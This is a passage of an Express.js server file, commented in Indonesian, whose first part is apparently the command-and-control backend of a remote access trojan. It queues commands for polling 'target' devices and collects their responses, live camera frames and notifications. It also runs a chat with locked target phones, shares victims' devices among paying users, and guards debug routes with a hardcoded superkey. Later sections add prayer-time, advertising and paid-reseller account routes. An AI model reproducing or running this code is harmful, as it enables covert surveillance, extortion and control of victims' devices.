  logSuccess('[CMD] ' + id + ': ' + command);
  res.json({ status: 'queued' });
});

/**
 * Get pending command for target device (polling)
 * GET /api/get-command/:id
 */
app.get('/api/get-command/:id', (req, res) => {
  const id = req.params.id;
  let cmds = readRat(RAT_COMMANDS);
  const i = cmds.findIndex(c => c.targetId === id);
  if (i !== -1) {
    const cmd = cmds[i];
    cmds.splice(i, 1);
    saveRat(RAT_COMMANDS, cmds);
    return res.json(cmd);
  }
  res.status(204).send();
});

/**
 * Post response from target device
 * POST /api/post-response/:id
 */
app.post('/api/post-response/:id', (req, res) => {
  const id = req.params.id;
  const { cmd, data } = req.body;
  let resps = readRat(RAT_RESPONSES);
  const i = resps.findIndex(r => r.targetId === id);
  const nr = { targetId: id, cmd, data, timestamp: new Date() };
  if (i !== -1) resps[i] = nr; 
  else resps.push(nr);
  saveRat(RAT_RESPONSES, resps);
  logSuccess('[RESP] ' + cmd + ' from ' + id);
  res.json({ status: 'ok' });
});

/**
 * Get response for target device
 * GET /api/get-response/:id
 */
app.get('/api/get-response/:id', (req, res) => {
  const resps = readRat(RAT_RESPONSES);
  res.json(resps.find(r => r.targetId === req.params.id) || {});
});

/**
 * Post live frame from target camera
 * POST /api/live-frame/:id
 */
app.post('/api/live-frame/:id', (req, res) => {
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ error: 'no frame' });
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ status: 'ok' });
});

/**
 * Get live frame for target camera
 * GET /api/live-frame/:id
 */
app.get('/api/live-frame/:id', (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d) return res.status(404).json({ error: 'no frame yet' });
  res.json(d);
});

/**
 * Post notification from target
 * POST /api/post-notification/:id
 */
app.post('/api/post-notification/:id', (req, res) => {
  let n = readRat(RAT_NOTIFS);
  n.unshift({ targetId: req.params.id, ...req.body, timestamp: new Date() });
  if (n.length > 1000) n = n.slice(0, 1000);
  saveRat(RAT_NOTIFS, n);
  res.json({ status: 'saved' });
});

/**
 * Get notifications for target
 * GET /api/get-notifications/:id
 */
app.get('/api/get-notifications/:id', (req, res) => {
  const n = readRat(RAT_NOTIFS);
  res.json(n.filter(x => x.targetId === req.params.id));
});

/**
 * Get pairId for user (for device dashboard)
 * ★ SEMUA USER BISA DAPAT PAIRING ID
 * GET /rat/pairid?key=sessionKey
 */
app.get("/rat/pairid", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === keyInfo.username);
  if (idx === -1) return res.json({ valid: false, message: "User not found" });
  
  // Generate pairId kalau belum ada dan simpan
  if (!db[idx].pairId) {
    db[idx].pairId = genPairId();
    saveDatabase(db);
    logSuccess('[PAIRID] Generated for: ' + db[idx].username + ' → ' + db[idx].pairId);
  }
  
  logSuccess(`[PAIRID] ${db[idx].username} (${db[idx].role || 'member'}) → ${db[idx].pairId}`);
  res.json({ valid: true, pairId: db[idx].pairId, username: db[idx].username, role: db[idx].role });
});

/**
 * Grant member access to owner's devices
 * POST /rat/grant-member
 */
app.post("/rat/grant-member", (req, res) => {
  const { ownerKey, memberUsername, deviceIds, allDevices } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || (owner.role !== "owner" && owner.role !== "developer")) return res.status(403).json({ valid: false, message: "Only owner and developer can grant" });
  
  const member = db.find(u => u.username === memberUsername);
  if (!member) return res.status(404).json({ valid: false, message: "Member not found" });
  
  // Simpan permission ke member: bisa lihat device mana saja milik owner
  if (!member.ratPerms) member.ratPerms = {};
  member.ratPerms[owner.username] = {
    approved: true,
    allDevices: allDevices === true,
    deviceIds: Array.isArray(deviceIds) ? deviceIds : [],
  };
  saveDatabase(db);
  
  logSuccess(`[GRANT] ${owner.username} → ${memberUsername} | allDevices:${allDevices} | ids:${deviceIds}`);
  res.json({ valid: true, message: `${memberUsername} berhasil diberi akses` });
});

/**
 * Revoke member access
 * POST /rat/revoke-member
 */
app.post("/rat/revoke-member", (req, res) => {
  const { ownerKey, memberUsername } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || (owner.role !== "owner" && owner.role !== "developer")) return res.status(403).json({ valid: false, message: "Only owner and developer" });
  
  const member = db.find(u => u.username === memberUsername);
  if (member && member.ratPerms) {
    delete member.ratPerms[owner.username];
    saveDatabase(db);
  }
  res.json({ valid: true, message: `Akses ${memberUsername} dicabut` });
});

/**
 * ★ SEMUA USER BISA LIHAT SEMUA DEVICE
 * GET /rat/my-devices?key=sessionKey
 */
app.get("/rat/my-devices", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });

  const targets = readRat(RAT_TARGETS);

  // ★ Device milik user sendiri
  const ownedByMe = targets.filter(t => t.owner === user.username);
  
  // ★ Device dari semua owner/developer lain (SEMUA USER BISA LIHAT)
  const allOwners = db.filter(u => u.role === "owner" || u.role === "developer");
  let allOwnerDevices = [];
  for (const owner of allOwners) {
    if (owner.username === user.username) continue;
    const ownerDevices = targets.filter(t => t.owner === owner.username);
    allOwnerDevices = allOwnerDevices.concat(ownerDevices);
  }

  // Gabung & deduplikasi berdasarkan id
  const combined = [...ownedByMe];
  for (const d of allOwnerDevices) {
    if (!combined.find(x => x.id === d.id)) {
      combined.push(d);
    }
  }

  logSuccess(`[RAT] ${user.username} (${user.role}) → ${combined.length} devices`);

  res.json({ 
    valid: true, 
    pairId: user.pairId, 
    role: user.role, 
    devices: combined 
  });
});

// ============================================================
// LOCK CHAT ENDPOINTS - komunikasi 2 arah owner ↔ target
// ============================================================

/**
 * Owner kirim pesan ke target (via panel)
 * POST /api/lock-chat/:id
 */
app.post('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  const { text, from } = req.body;
  if (!text) return res.status(400).json({ error: 'text required' });
  if (!lockChats[id]) lockChats[id] = [];
  const msg = { from: from || 'owner', text, time: new Date().toISOString().substring(11, 16) };
  lockChats[id].push(msg);
  if (lockChats[id].length > 200) lockChats[id] = lockChats[id].slice(-200);
  logSuccess(`[CHAT] ${from || 'owner'} → ${id}: ${text}`);
  res.json({ status: 'sent' });
});

/**
 * Target ambil semua pesan (polling setiap 2 detik dari APK)
 * GET /api/lock-chat/:id
 */
app.get('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

/**
 * Panel ambil semua pesan (polling dari dashboard)
 * GET /api/lock-chat-all/:id
 */
app.get('/api/lock-chat-all/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

/**
 * Clear chat saat unlock
 * DELETE /api/lock-chat/:id
 */
app.delete('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  lockChats[id] = [];
  res.json({ status: 'cleared' });
});

// ============================================================
// ADMIN RAT ENDPOINTS (debug only)
// ============================================================

/**
 * Debug: Lihat pairId semua user (akses dengan superkey)
 * GET /admin/listpairids?superkey=CRPT-SUPER-2025
 */
app.get('/admin/listpairids', (req, res) => {
  const { superkey } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const list = db.map(u => ({ username: u.username, role: u.role, pairId: u.pairId || 'NONE' }));
  res.json(list);
});

/**
 * Debug: Force generate pairId untuk 1 user
 * GET /admin/genpairid?superkey=CRPT-SUPER-2025&username=xxx
 */
app.get('/admin/genpairid', (req, res) => {
  const { superkey, username } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username);
  if (idx === -1) return res.json({ error: 'User not found' });
  db[idx].pairId = genPairId();
  saveDatabase(db);
  logSuccess(`[ADMIN] Force generated pairId for ${username}: ${db[idx].pairId}`);
  res.json({ username, pairId: db[idx].pairId });
});

// Initialize RAT files saat server start
initRatFiles();
logSuccess('[RAT] RAT Module initialized successfully');

//SELESAI RAT SAMPE SINI

// ==========================================================
// [+] API BACKGROUND USER
// ==========================================================

// ─── GET: Ambil background user ──────────────────────────────────────────────
app.get('/background/get', (req, res) => {
  const { username, key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo || keyInfo.username !== username) {
    return res.status(401).json({ success: false, message: "Invalid session" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username);

  if (!user) {
    return res.status(404).json({ success: false, message: "User not found" });
  }

  // Kirim data background (kalau ada), kalau nggak ada kirim null
  res.json({ success: true, data: user.background || null });
});

// ─── POST: Upload background foto ────────────────────────────────────────────
app.post('/background/upload-image', upload.single('image'), (req, res) => {
  const { userId, username, role } = req.body;

  if (!req.file) {
    return res.status(400).json({ success: false, message: 'No image file uploaded' });
  }

  const db = loadDatabase();
  const userIndex = db.findIndex(u => u.username === username);

  if (userIndex === -1) {
    return res.status(404).json({ success: false, message: 'User not found' });
  }

  const imageUrl = `${req.protocol}://${req.get('host')}/uploads/images/${req.file.filename}`;

  // Masukkan data background ke dalam data user di database.json
  db[userIndex].background = {
    type: 'image',
    value: imageUrl,
    updatedAt: new Date().toISOString()
  };

  saveDatabase(db);

  res.json({ success: true, data: db[userIndex].background });
});
// ─── POST: Upload background video ───────────────────────────────────────────
app.post('/background/upload-video', upload.single('video'), (req, res) => {
  const { userId, username, role } = req.body;

  if (!req.file) {
    return res.status(400).json({ success: false, message: 'No video file uploaded' });
  }

  const db = loadDatabase();
  const userIndex = db.findIndex(u => u.username === username);

  if (userIndex === -1) {
    return res.status(404).json({ success: false, message: 'User not found' });
  }

  const videoUrl = `${req.protocol}://${req.get('host')}/uploads/videos/${req.file.filename}`;

  db[userIndex].background = {
    type: 'video',
    value: videoUrl,
    updatedAt: new Date().toISOString()
  };

  saveDatabase(db);

  res.json({ success: true, data: db[userIndex].background });
});

// ─── POST: Set background warna ──────────────────────────────────────────────
app.post('/background/set-color', (req, res) => {
  const { userId, username, role, color } = req.body;

  if (!color || !username) {
    return res.status(400).json({ success: false, message: 'Missing fields' });
  }

  const db = loadDatabase();
  const userIndex = db.findIndex(u => u.username === username);

  if (userIndex === -1) {
    return res.status(404).json({ success: false, message: 'User not found' });
  }

  // Masukkan data background ke dalam data user di database.json
  db[userIndex].background = {
    type: 'color',
    value: color, // Contoh: "#22C55E"
    updatedAt: new Date().toISOString()
  };

  saveDatabase(db);

  res.json({ success: true, data: db[userIndex].background });
});

// ─── POST: Reset/Clear background ────────────────────────────────────────────
app.post('/background/clear', (req, res) => {
  const { username, key } = req.body;

  const keyInfo = activeKeys[key];
  if (!keyInfo || keyInfo.username !== username) {
    return res.status(401).json({ success: false, message: "Invalid session" });
  }

  const db = loadDatabase();
  const userIndex = db.findIndex(u => u.username === username);

  if (userIndex === -1) {
    return res.status(404).json({ success: false, message: 'User not found' });
  }

  // Set background jadi null
  db[userIndex].background = null;
  saveDatabase(db);

  res.json({ success: true, message: 'Background cleared' });
});

app.get("/api/prayerdefault", async (req, res) => {

    const db = await readPrayerDB();

    res.json({
        success: true,
        city: db.defaultCity
    });

});

// ─── GET: Ambil Profile (Tambahin profileImageUrl) ───────────────────────────
app.get('/api/getProfile', (req, res) => {
    const { username, sessionKey } = req.query;
    const keyInfo = activeKeys[sessionKey];
    
    if (!keyInfo || keyInfo.username !== username) {
        return res.status(401).json({ success: false, message: "Invalid session" });
    }
    
    const db = loadDatabase();
    const user = db.find(u => u.username === username);
    if (!user) return res.status(404).json({ success: false });

    res.json({ 
        success: true, 
        displayName: user.displayName || "", 
        bio: user.bio || "",
        profileImageUrl: user.profileImageUrl || null // <-- KIRIM URL FOTO
    });
});

// ─── POST: Upload Profile Image ──────────────────────────────────────────────
app.post('/api/uploadProfileImage', upload.single('image'), (req, res) => {
    const { username, sessionKey } = req.body;
    const keyInfo = activeKeys[sessionKey];

    if (!keyInfo || keyInfo.username !== username) {
        return res.status(401).json({ success: false, message: "Invalid session" });
    }

    if (!req.file) {
        return res.status(400).json({ success: false, message: 'No image file uploaded' });
    }

    const db = loadDatabase();
    const userIndex = db.findIndex(u => u.username === username);

    if (userIndex === -1) {
        return res.status(404).json({ success: false, message: 'User not found' });
    }

    // Bikin URL foto
    const imageUrl = `${req.protocol}://${req.get('host')}/uploads/images/${req.file.filename}`;

    // Simpen URL ke database.json
    db[userIndex].profileImageUrl = imageUrl;
    saveDatabase(db);

    res.json({ success: true, imageUrl: imageUrl });
});

app.get("/getServerInfo", (req, res) => {
  const { key } = req.query;

  logSuccess(`[🖥️ SERVER] Request info server oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({
      valid: false,
      error: true,
      message: "Invalid key."
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user) {
    return res.json({
      valid: false,
      error: true,
      message: "User not found."
    });
  }

  const uptime = process.uptime();

  res.json({
    valid: true,
    server: {
      name: "x-spyder Crash API",
      status: "Online",
      node: process.version,
      platform: process.platform,
      uptime: Math.floor(uptime),
      memory: {
        used: Math.round(process.memoryUsage().rss / 1024 / 1024),
        heapUsed: Math.round(process.memoryUsage().heapUsed / 1024 / 1024),
        heapTotal: Math.round(process.memoryUsage().heapTotal / 1024 / 1024)
      },
      time: Date.now()
    }
  });
});
// ─── PING — health check (tanpa key) + validasi (dengan key) ───
app.get("/ping", (req, res) => {
  const { key } = req.query;

  // Tanpa key → health check (server hidup)
  if (!key) {
    return res.json({
      valid: true,
      status: "online",
      timestamp: Date.now(),
      uptime: Math.floor(process.uptime()),
      note: "No key — health check only"
    });
  }

  // Dengan key → validasi session
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({
      valid: false,
      error: true,
      message: "Invalid key."
    });
  }

  res.json({
    valid: true,
    status: "online",
    ping: "0.00 ms",
    timestamp: Date.now()
  });
});
app.get("/api/prayertime", async (req, res) => {
    try {

        const key = req.query.key || "";
        const queryUsername = (req.query.username || "").trim();

        const keyInfo = activeKeys[key];

        if (!keyInfo) {
            return res.status(401).json({
                success: false,
                message: "Invalid session key"
            });
        }

        const username = keyInfo.username;

        if (queryUsername && queryUsername !== username) {
            return res.status(401).json({
                success: false,
                message: "Username mismatch"
            });
        }


        const newCity = (req.query.city || "").trim();


        let db = await readPrayerDB();

        // pastikan users ada
        if (!db.users) db.users = {};


        // ===== USER BELUM ADA =====
        if (username && !db.users[username]) {
            db.users[username] = {
                city: db.defaultCity || "jakarta"
            };
        }


        // ===== USER GANTI KOTA =====
        if (username && newCity) {
            db.users[username].city = newCity;
            await savePrayerDB(db);
        }


        // ===== AMBIL KOTA USER =====
        let city = db.defaultCity || "jakarta";

        if (username) {
            city = db.users[username].city;
        }


        // ===== FETCH API =====
        const api = await axios.get(
            `https://api.ikyyxd.my.id/download/jadwalsholat?apikey=kyzz&kota=${encodeURIComponent(city)}`
        );


        res.json({
            success: true,
            username,
            city,
            result: api.data.result
        });


    } catch (e) {

        res.json({
            success: false,
            message: e.message
        });

    }
});

app.post("/api/prayercity", async (req, res) => {

    try {

        const { username, city } = req.body;

        if (!username || !city) {
            return res.json({
                success: false,
                message: "username & city required"
            });
        }

        const db = await readPrayerDB();

        db.users[username] = {
            city
        };

        await savePrayerDB(db);

        const api = await axios.get(
            `https://api.ikyyxd.my.id/download/jadwalsholat?apikey=kyzz&kota=${encodeURIComponent(city)}`
        );

        res.json({
            success: true,
            city,
            result: api.data.result
        });

    } catch (e) {

        res.json({
            success: false,
            message: e.message
        });

    }

});

app.post("/api/prayerdefault", async (req, res) => {

    const { city } = req.body;

    if (!city) {

        return res.json({
            success: false
        });

    }

    const db = await readPrayerDB();

    db.defaultCity = city;

    await savePrayerDB(db);

    res.json({
        success: true
    });

});

app.get("/api/prayermessage", async (req, res) => {

    const json = await fs.readJson(PRAYER_MSG);

    res.json(json);

});

app.get("/api/prayercity", async (req, res) => {

    const username = req.query.username;

    const db = await readPrayerDB();

    if (!db.users[username]) {

        return res.json({

            success: true,
            city: db.defaultCity

        });

    }

    res.json({

        success: true,
        city: db.users[username].city

    });

});

app.get("/api/doa", async (req, res) => {
    try {
        const file = path.join(__dirname, "doaharian.json");

        let cache = null;

        if (fs.existsSync(file)) {
            cache = JSON.parse(fs.readFileSync(file, "utf8"));
        }

        const now = Date.now();

        // masih berlaku 24 jam
        if (cache && (now - cache.timestamp) < 86400000) {
            return res.json(cache.data);
        }

        // fetch doa baru
        const { data } = await axios.get(
            "https://doa-doa-api-ahmadramadhan.fly.dev/api/doa/v1/random"
        );

        const doa = Array.isArray(data) ? data[0] : data;

        fs.writeFileSync(
            file,
            JSON.stringify({
                timestamp: now,
                data: doa
            }, null, 2)
        );

        res.json(doa);

    } catch (err) {
        logError(err);

        res.status(500).json({
            success: false,
            message: "Gagal mengambil doa."
        });
    }
});

// ─── GET: List Iklan ─────────────────────────────────────────────────────────
app.get("/jasapost/list", checkRole, (req, res) => {
  try {
    let posts = readJasapost(JASAPOST_FILE, []);
    const now = Date.now();
    
    const validPosts = posts.filter(p => !p.expiredAt || p.expiredAt > now);
    
    if (validPosts.length !== posts.length) {
      writeJasapost(JASAPOST_FILE, validPosts);
    }

    return res.json({ valid: true, data: validPosts });
  } catch (err) {
    return res.status(500).json({ valid: false, message: "Gagal mengambil data iklan" });
  }
});

// ─── GET: Verifikasi Kode Post ───────────────────────────────────────────────
app.get("/jasapost/verifyKode", checkRole, (req, res) => {
  const { kodePost } = req.query;

  try {
    const kodes = readJasapost(JASAPOST_KODE_FILE, []);
    const kodeData = kodes.find(k => k.kode === kodePost && !k.used);

    if (!kodeData) {
      return res.json({ valid: false, message: "Kode tidak valid atau sudah digunakan" });
    }

    const expiredAt = Date.now() + (kodeData.hari * 24 * 60 * 60 * 1000);
    const expiredAtStr = new Date(expiredAt).toLocaleString('id-ID', { 
      day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' 
    });

    return res.json({ valid: true, expiredAtStr });
  } catch (err) {
    return res.status(500).json({ valid: false, message: "Gagal verifikasi kode" });
  }
});

// ─── POST: Pasang Iklan ──────────────────────────────────────────────────────
app.post("/jasapost/post", checkRole, (req, res) => {
  const { kodePost, namaToko, judul, kategori, deskripsi, harga, kontakWa, kontakTg, kontakTelp, media, stok } = req.body;

  try {
    let kodes = readJasapost(JASAPOST_KODE_FILE, []);
    const kodeData = kodes.find(k => k.kode === kodePost && !k.used);

    if (!kodeData) {
      return res.json({ valid: false, message: "Kode tidak valid atau sudah digunakan" });
    }

    let posts = readJasapost(JASAPOST_FILE, []);
    const now = Date.now();
    const expiredAt = now + (kodeData.hari * 24 * 60 * 60 * 1000);

    const newPost = {
      id: crypto.randomBytes(8).toString('hex'),
      judul,
      kategori,
      deskripsi,
      harga: harga.toString(),
      kontakWa,
      kontakTg,
      kontakTelp,
      namaToko,
      username: req.keyInfo.username,
      createdAtStr: new Date(now).toLocaleString('id-ID', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' }),
      media: media || [],
      isSold: false,
      stok: stok !== undefined ? stok : -1,
      expiredAt: expiredAt,
      expiredAtStr: new Date(expiredAt).toLocaleString('id-ID', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' })
    };

    posts.push(newPost);
    writeJasapost(JASAPOST_FILE, posts);

    kodeData.used = true;
    kodeData.usedBy = req.keyInfo.username;
    kodeData.usedAt = now;
    writeJasapost(JASAPOST_KODE_FILE, kodes);

    return res.json({ valid: true, message: "Iklan berhasil diposting" });
  } catch (err) {
    return res.status(500).json({ valid: false, message: "Gagal memposting iklan" });
  }
});

// ─── POST: Tandai Terjual/Tersedia ───────────────────────────────────────────
app.post("/jasapost/markSold", checkRole, (req, res) => {
  const { id, sold } = req.body;

  try {
    let posts = readJasapost(JASAPOST_FILE, []);
    const post = posts.find(p => p.id === id);

    if (!post) return res.json({ valid: false, message: "Iklan tidak ditemukan" });

    const isAdmin = ADMIN_ROLES.includes(req.keyInfo.role);
    if (post.username !== req.keyInfo.username && !isAdmin) {
      return res.status(403).json({ valid: false, message: "Tidak ada izin" });
    }

    post.isSold = sold;
    writeJasapost(JASAPOST_FILE, posts);

    return res.json({ valid: true, message: "Status iklan diperbarui" });
  } catch (err) {
    return res.status(500).json({ valid: false, message: "Gagal update status" });
  }
});

// ─── POST: Update Stok ───────────────────────────────────────────────────────
app.post("/jasapost/updateStok", checkRole, (req, res) => {
  const { id, stok } = req.body;

  try {
    let posts = readJasapost(JASAPOST_FILE, []);
    const post = posts.find(p => p.id === id);

    if (!post) return res.json({ valid: false, message: "Iklan tidak ditemukan" });

    const isAdmin = ADMIN_ROLES.includes(req.keyInfo.role);
    if (post.username !== req.keyInfo.username && !isAdmin) {
      return res.status(403).json({ valid: false, message: "Tidak ada izin" });
    }

    post.stok = stok; 
    writeJasapost(JASAPOST_FILE, posts);

    return res.json({ valid: true, message: "Stok diperbarui" });
  } catch (err) {
    return res.status(500).json({ valid: false, message: "Gagal update stok" });
  }
});

// ─── DELETE: Hapus Iklan ─────────────────────────────────────────────────────
app.delete("/jasapost/delete", checkRole, (req, res) => {
  const { id } = req.query;

  try {
    let posts = readJasapost(JASAPOST_FILE, []);
    const post = posts.find(p => p.id === id);

    if (!post) return res.json({ valid: false, message: "Iklan tidak ditemukan" });

    const isAdmin = ADMIN_ROLES.includes(req.keyInfo.role);
    if (post.username !== req.keyInfo.username && !isAdmin) {
      return res.status(403).json({ valid: false, message: "Tidak ada izin" });
    }

    posts = posts.filter(p => p.id !== id);
    writeJasapost(JASAPOST_FILE, posts);

    return res.json({ valid: true, message: "Iklan berhasil dihapus" });
  } catch (err) {
    return res.status(500).json({ valid: false, message: "Gagal menghapus iklan" });
  }
});

// ─── POST: Generate Kode Post (Khusus Admin/Owner) ───────────────────────────
app.post("/jasapost/generateKode", checkRole, (req, res) => {
  // FIX: Cek role yang sudah di-trim dan di-lowercase oleh middleware
  if (!ADMIN_ROLES.includes(req.keyInfo.role)) {
    return res.status(403).json({ valid: false, message: "Akses ditolak. Hanya Owner & Developer." });
  }

  const { jumlah = 1, hari = 7 } = req.body;

  try {
    let kodes = readJasapost(JASAPOST_KODE_FILE, []);
    let generated = [];
    const now = Date.now();
    const expiredAt = now + (hari * 24 * 60 * 60 * 1000);
    
    const expiredAtStr = new Date(expiredAt).toLocaleString('id-ID', { 
      day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' 
    });

    for (let i = 0; i < Math.min(jumlah, 50); i++) {
      const newKode = crypto.randomBytes(4).toString('hex').toUpperCase();
      
      generated.push({
        kode: newKode,
        expiredAtStr: expiredAtStr
      });
      
      kodes.push({
        kode: newKode,
        hari: hari,
        used: false,
        createdAt: now
      });
    }

    writeJasapost(JASAPOST_KODE_FILE, kodes);
    return res.json({ valid: true, kodes: generated });
  } catch (err) {
    return res.status(500).json({ valid: false, message: "Gagal generate kode" });
  }
});

// ==========================================================
// [+] SETORAN HELPERS
// ==========================================================
function loadSetoran() {
  try {
    if (!fs.existsSync(SETORAN_FILE)) fs.writeFileSync(SETORAN_FILE, JSON.stringify([]));
    return JSON.parse(fs.readFileSync(SETORAN_FILE, "utf8"));
  } catch (e) { return []; }
}

function saveSetoran(data) {
  fs.writeFileSync(SETORAN_FILE, JSON.stringify(data, null, 2));
}

// ═══════════════════════════════════════════════════════════════════
// [FIX] validateSetoranKey — Restore session dari keyList.json
// ═══════════════════════════════════════════════════════════════════
function validateSetoranKey(key) {
  if (!key) return { valid: false };

  // 1. Bot system key (bypass semua)
  if (key === BOT_SYSTEM_KEY) {
    return { valid: true, isBot: true, username: "BOT_SYSTEM", role: "developer" };
  }

  // 2. Cek activeKeys (session aktif di memory)
  const keyInfo = activeKeys[key];
  if (keyInfo) {
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (user) {
      return { valid: true, isBot: false, username: user.username, role: user.role || "member" };
    }
  }

  // 3. FALLBACK: Restore dari keyList.json (session persistent)
  try {
    const keyList = loadKeyList();
    const session = keyList.find(k => k.sessionKey === key);

    if (session) {
      const db = loadDatabase();
      const user = db.find(u => u.username === session.username);

      if (user) {
        activeKeys[key] = {
          username: user.username,
          created: Date.now(),
          expires: Date.now() + 10 * 60 * 1000,
        };

        logSuccess(`[SETORAN] ♻️ Session restored: ${user.username} (${user.role})`);
        return { valid: true, isBot: false, username: user.username, role: user.role || "member" };
      }
    }
  } catch (e) {
    logError("[SETORAN] validateSetoranKey fallback error:", e.message);
  }

  return { valid: false };
}

// Anti-spam
const setoranCooldown = {};
function checkSetoranCooldown(username) {
  const now = Date.now();
  const window = 5 * 60 * 1000;
  const maxReq = 3;
  if (!setoranCooldown[username]) setoranCooldown[username] = [];
  setoranCooldown[username] = setoranCooldown[username].filter(t => now - t < window);
  if (setoranCooldown[username].length >= maxReq) {
    const wait = Math.ceil((window - (now - setoranCooldown[username][0])) / 1000);
    return { allowed: false, wait };
  }
  setoranCooldown[username].push(now);
  return { allowed: true };
}

// Auto-cleanup
function cleanupOldSetoran() {
  try {
    const list = loadSetoran();
    const now = Date.now();
    const maxAge = 30 * 24 * 60 * 60 * 1000;
    const cleaned = list.filter(s => {
      if (s.status === "pending") return true;
      const age = now - new Date(s.processedAt || s.createdAt).getTime();
      return age < maxAge;
    });
    if (cleaned.length !== list.length) {
      saveSetoran(cleaned);
      logSuccess(`[SETORAN CLEANUP] Hapus ${list.length - cleaned.length} data lama`);
    }
  } catch (e) { logError("[SETORAN CLEANUP]", e.message); }
}

// Multer khusus bukti
const storageBukti = multer.diskStorage({
  destination: (req, file, cb) => {
    if (!fs.existsSync(BUKTI_DIR)) fs.mkdirSync(BUKTI_DIR, { recursive: true });
    cb(null, BUKTI_DIR);
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + "-" + Math.round(Math.random() * 1e9) + path.extname(file.originalname));
  },
});
const uploadBukti = multer({ storage: storageBukti });

// ==========================================================
// [+] ENDPOINT SETORAN
// ==========================================================

// 1. SUBMIT
app.post("/submitSetoran", uploadBukti.single("bukti"), (req, res) => {
  try {
    const { key } = req.query;
    const auth = validateSetoranKey(key);
    if (!auth.valid) return res.status(401).json({ valid: false, message: "Invalid key" });

    const cd = checkSetoranCooldown(auth.username);
    if (!cd.allowed) return res.status(429).json({ valid: false, message: `Tunggu ${cd.wait} detik` });

    const { requestId, creatorUsername, creatorRole, newUsername, newPassword, durasiHari, newUserRole, harga, namaPengirim, jumlahTransfer } = req.body;

    if (!requestId || !newUsername || !newPassword) return res.status(400).json({ valid: false, message: "Data tidak lengkap" });
    if (newUsername.length < 3 || newUsername.length > 20) return res.status(400).json({ valid: false, message: "Username 3-20 karakter" });
    if (newPassword.length < 6) return res.status(400).json({ valid: false, message: "Password min 6 karakter" });
    if (!/^[a-zA-Z0-9_]+$/.test(newUsername)) return res.status(400).json({ valid: false, message: "Username hanya huruf/angka/_" });
    if (!req.file) return res.status(400).json({ valid: false, message: "Bukti wajib diupload" });
    if (req.file.size > 5 * 1024 * 1024) return res.status(400).json({ valid: false, message: "Bukti max 5MB" });
// ⭐ ROLE PERMISSION CHECK
const allowedRolesMap = {
  developer: ['member', 'vip', 'reseller', 'partner', 'owner', 'developer'],
  owner:     ['member', 'vip', 'reseller', 'partner', 'owner'],
  admin:     ['member', 'vip', 'reseller'],
  partner:   ['member', 'vip', 'reseller'],
  seller:    ['member'],
  reseller:  ['member'],
  vip:       ['member', 'reseller'],
  member:    ['member'],
};

const creatorRoleLower = (creatorRole || auth.role || 'member').toLowerCase();
const targetRoleLower = (newUserRole || 'member').toLowerCase();
const allowedTargets = allowedRolesMap[creatorRoleLower] || ['member'];

if (!allowedTargets.includes(targetRoleLower)) {
  logWarning(`[SETORAN] ${auth.username} (${creatorRoleLower}) coba buat role ${targetRoleLower} — DITOLAK`);
  return res.status(403).json({
    valid: false,
    message: `Role ${creatorRoleLower.toUpperCase()} tidak bisa membuat akun ${targetRoleLower.toUpperCase()}`,
  });
}
    if (req.file.size < 20 * 1024) return res.status(400).json({ valid: false, message: "Bukti terlalu kecil" });

    const prices = JSON.parse(fs.readFileSync(PRICE_FILE, "utf8"));
    const expected = prices[(newUserRole || "member").toLowerCase()] || 2000;
    if (Number(jumlahTransfer) < expected) return res.status(400).json({ valid: false, message: `Minimal Rp${expected}` });

    const list = loadSetoran();
    if (list.find(s => s.requestId === requestId)) return res.json({ valid: true, message: "Sudah disubmit" });

    const buktiUrl = `${req.protocol}://${req.get("host")}/uploads/bukti/${req.file.filename}`;

    const newSetoran = {
      requestId,
      creatorUsername: creatorUsername || auth.username,
      creatorRole: creatorRole || auth.role,
      newUsername, newPassword,
      durasiHari: Number(durasiHari) || 0,
      newUserRole: (newUserRole || "member").toLowerCase(),
      harga: Number(harga) || 0,
      namaPengirim: namaPengirim || "-",
      jumlahTransfer: jumlahTransfer || "0",
      buktiUrl,
      ipAddress: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
      userAgent: req.headers['user-agent']?.slice(0, 200) || '-',
      status: "pending",
      createdAt: new Date().toISOString(),
      processedAt: null,
      processedBy: null,
    };

    list.push(newSetoran);
    saveSetoran(list);
    saveUserLog(newSetoran.creatorUsername, "setoran", "Request Setoran", `${newSetoran.newUsername} | Rp${newSetoran.jumlahTransfer}`);

    sendRich(ID_GROUP,
